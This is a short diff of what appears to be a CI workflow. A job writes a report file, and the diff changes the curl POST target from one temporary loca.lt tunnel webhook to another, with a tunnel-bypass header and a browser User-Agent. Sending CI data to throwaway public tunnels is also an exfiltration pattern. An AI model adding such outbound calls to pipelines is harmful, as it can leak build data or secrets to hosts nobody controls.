@@ -48,7 +48,7 @@ jobs:
           };
           fs.writeFileSync("final-report.json", JSON.stringify(report, null, 2));
         '
-        curl -s -X POST "https://pretty-olives-clean.loca.lt/webhook" \
+        curl -s -X POST "https://dark-waves-heal.loca.lt/webhook" \
           -H "Content-Type: application/json" \
           -H "bypass-tunnel-reminder: true" \
           -H "User-Agent: Mozilla/5.0" \
